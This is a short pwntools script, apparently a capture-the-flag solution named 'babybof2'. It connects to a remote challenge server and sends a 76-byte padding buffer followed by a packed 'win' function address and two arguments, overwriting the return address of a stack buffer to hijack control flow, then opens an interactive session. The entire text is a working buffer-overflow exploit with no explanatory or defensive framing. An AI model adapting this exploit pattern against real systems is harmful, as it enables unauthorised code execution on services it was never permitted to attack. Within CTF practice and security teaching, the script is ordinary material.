#babybof2
from pwn import *
#conn = process ('./winners')
conn=remote("chals20.cybercastors.com",14434)
buf="a"*76 #73
#bin_sh=p32(0xF7F57406)
win=p32(0x08049196)
arg_1=p32(0x182)
arg2_2=p32(0x102)

out=buf+win+arg_1 + arg2_2
conn.sendline(out)
conn.interactive()
#print conn.recv()
